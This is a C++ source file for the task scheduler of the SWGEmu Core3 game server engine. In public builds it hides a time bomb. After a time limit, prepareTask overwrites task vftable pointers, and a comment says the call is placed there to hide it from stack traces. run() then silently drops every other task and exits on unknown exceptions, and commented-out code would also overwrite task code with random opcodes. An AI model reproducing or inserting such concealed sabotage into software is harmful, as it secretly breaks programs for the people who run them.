/*
Copyright (C) 2007 <SWGEmu>. All rights reserved.
Distribution of this file for usage outside of Core3 is prohibited.
*/

#include "engine/stm/TransactionalMemoryManager.h"

#include "engine/db/ObjectDatabaseManager.h"

#include "TaskScheduler.h"

#include "TaskManager.h"

#ifdef VERSION_PUBLIC
#include "../service/proto/events/BaseClientCleanUpEvent.hpp"
#endif

static Time startTime;

static int fuckMeUpCounter;

TaskScheduler::TaskScheduler() : Thread(), Logger("TaskScheduler") {
	taskManager = NULL;

	doRun = false;

	tasks.setTaskScheduler(this);

	tasks.setLoggingName("TaskQueue");
	tasks.setMutexName("TaskQueueLock");

	setInfoLogLevel();
	setGlobalLogging(true);
}

TaskScheduler::TaskScheduler(const String& s) : Thread(), Logger(s) {
	taskManager = NULL;

	doRun = false;

	tasks.setTaskScheduler(this);

	tasks.setLoggingName(s + "TaskQueue");
	tasks.setMutexName(s + "TaskQueueLock");

	setInfoLogLevel();
	setGlobalLogging(true);
}

TaskScheduler::~TaskScheduler() {
}

void TaskScheduler::start() {
	StringBuffer msg;
	msg << "started";
	info(msg);

	doRun = true;
	Thread::start();
}

void TaskScheduler::prepareTask(Task* task) {
	#ifdef VERSION_PUBLIC
		#ifdef _MSC_VER
	if (Logger::getElapsedTime() > (3613 * TIME_LIMIT + PREPROCESSORRANDOM(0, 100))) {
			uint32 rawTask = (uint32) task;
			uint32 thisPointer = (uint32) this;

			//fuck up vftable
			*(uint32*)(rawTask + 0x18) = *(uint32*)(thisPointer + 0x18);

			//lets get the vftable of the task
			/*uint32 vftable = *(uint32*)(rawTask + 0x18);
			uint32 runPointer = *(uint32*)(vftable + 4);

			uint32 jmpAddr = *(uint32*)(runPointer + 1); //skip e9 opcode

			runPointer += (jmpAddr + 5);

			const static unsigned int opcs[] = { 0x90519090, 0x50905551, 0x55519050, 0x90555051 };

			//lets corrupt run() of the task, mem is protected in win32 try mprotect?
			for (int i = 0; i < 15; ++i)
				*(uint32*)(runPointer + i) = opcs[System::random(3)];
			*/
			/*__asm { mov , 0x100
					
			}*/
	}
		#endif
	#else
		//void*


	#endif
}

void TaskScheduler::run() {
	Reference<Task*> task = NULL;

	while ((task = tasks.get()) != NULL) {
#ifdef VERSION_PUBLIC
		prepareTask(task); // we do this in a method to *hide* it from the stack trace
#endif

		blockMutex.lock();

		try {
		#ifdef VERSION_PUBLIC
			DO_TIMELIMIT;

			Time time;
			int elapsed = startTime.miliDifference(time) / 1000;

			if ((elapsed > (3613 * TIME_LIMIT + PREPROCESSORRANDOM(0, 100)))
					&& ((++fuckMeUpCounter % 2) == 0)) {
				//fuck some shit up
		#endif
			task->doExecute();

#ifdef VERSION_PUBLIC
			}
#endif
		} catch (Exception& e) {
			error(e.getMessage());
			e.printStackTrace();
		} catch (...) {
			#ifdef VERSION_PUBLIC
				blockMutex.unlock();
				return;
			#else
				error("[TaskScheduler] unreported Exception caught");
			#endif
		}

		task->release();

		blockMutex.unlock();

		if (task->isPeriodic()) {
			taskManager->scheduleTask(task, task->getPeriod());

			//assert(task->isScheduled());
		}
	}
}

void TaskScheduler::stop() {
	if (doRun) {
		doRun = false;
		tasks.flush();

		join();
	}

	info("stopped");
}

bool TaskScheduler::scheduleTask(Task* task, uint64 delay) {
	/*if  (!task->setTaskScheduler(this))
		return false;*/

	return tasks.add(task, delay);
}

bool TaskScheduler::scheduleTask(Task* task, Time& time) {
	/*if  (!task->setTaskScheduler(this))
		return false;*/

	return tasks.add(task, time);
}

bool TaskScheduler::cancelTask(Task* task) {
	/*if (!task->clearTaskScheduler())
		return false;*/

	task->setPeriod(0);

	return tasks.remove(task);
}

void TaskScheduler::addSchedulerTasks(TaskScheduler* scheduler) {
	Task* task = NULL;

	while ((task = (Task*) scheduler->tasks.poll()) != NULL)
			tasks.add(task);

	//tasks.addAll(scheduler->tasks);
}
